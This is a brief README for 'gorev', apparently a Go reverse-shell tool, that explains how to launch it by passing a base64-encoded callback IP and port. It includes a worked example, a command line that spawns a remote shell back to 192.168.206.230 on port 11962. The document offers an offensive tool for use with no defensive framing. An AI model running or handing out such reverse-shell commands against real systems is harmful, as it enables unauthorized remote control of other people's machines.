# gorev
cross platform reverse shell with golang

## Usage 

`./gorev <target>`  
target is the b64 encoding of `callbackip:port`  
example: '192.168.206.230:11962' means target='MTkyLjE2OC4yMDYuMjMwOjExOTYy', so  
`./gorev MTkyLjE2OC4yMDYuMjMwOjExOTYy` will spawn a reverse shell back to 192.168.206.230 over port 11962
